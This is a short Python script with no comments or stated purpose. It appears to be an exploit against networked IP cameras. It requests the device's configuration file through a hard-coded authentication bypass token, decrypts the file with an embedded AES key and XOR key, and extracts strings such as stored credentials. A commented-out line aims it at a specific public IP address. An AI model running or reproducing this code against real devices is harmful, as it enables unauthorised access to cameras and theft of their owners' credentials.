import requests 
from itertools import cycle
from Crypto.Cipher import AES
import re
    
def config(ip) : 
    config_file = requests.get('http://{}/System/configurationFile?auth=YWRtaW46MTEK'.format(ip))
    return config_file.content

def save_config(ip,config_file) : 
    with open(f'{ip}_config_file','wb') as file : 
        file.write(config_file)

def decrpyted_config(config_file) : 

    def add_to_16(s):
        while len(s) % 16 != 0:
            s += b'\0'
        return s 

    def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
        key = bytes.fromhex(hex_key)
        ciphertext = add_to_16(ciphertext)
        cipher = AES.new(key, AES.MODE_ECB)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

    def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
        return bytes(a ^ b for a, b in zip(data, cycle(key)))

    def strings(file):
        chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
        shortestReturnChar = 2
        regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
        pattern = re.compile(regExp)
        return pattern.findall(file)

    def main() :    
        xor = xore( decrypt(config_file) )
        result_list = strings(xor.decode('ISO-8859-1'))
        return result_list
    return main()

#print(config('185.120.251.239'))